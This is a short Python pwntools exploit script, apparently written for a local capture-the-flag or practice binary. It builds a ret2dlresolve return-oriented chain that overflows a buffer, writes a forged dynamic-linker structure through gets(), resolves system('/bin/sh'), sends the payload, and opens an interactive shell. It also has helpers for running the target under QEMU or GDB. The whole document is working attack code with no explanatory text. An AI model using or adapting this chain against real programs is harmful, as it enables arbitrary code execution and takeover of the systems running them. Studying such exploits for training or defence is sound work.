from pwn import *

binary = args.BIN

context.terminal = ["tmux", "splitw", "-h"]
e = context.binary = ELF(binary)
r = ROP(e)


gs = '''
break *0x401020
continue
'''


def start():
    if (args.QEMU and args.GDB):
        p=process(['qemu-amd64', '-g', '1234', e.path])
        gdb.attach(target=('localhost',1234), exe=e.path, gdbscript=gs)
        return p
    elif (args.QEMU):
        return process(['qemu-amd64', e.path])
    elif args.GDB:
        return gdb.debug(e.path, gdbscript=gs)
    else:
        return process(e.path)


p = start()

dlresolve = Ret2dlresolvePayload(e, symbol="system", args=["/bin/sh"])

r.raw(cyclic(16))                           # padding
r.raw(p64(r.find_gadget(['ret'])[0]))       # ret to align stack
r.gets(dlresolve.data_addr)                 # gets(writeable_mem)
r.ret2dlresolve(dlresolve)                  # dlresolve chain
r.raw(b"\n")
r.raw(dlresolve.payload)                    # fake struct

r.dump()

p.sendline(bytes(r))

p.interactive()
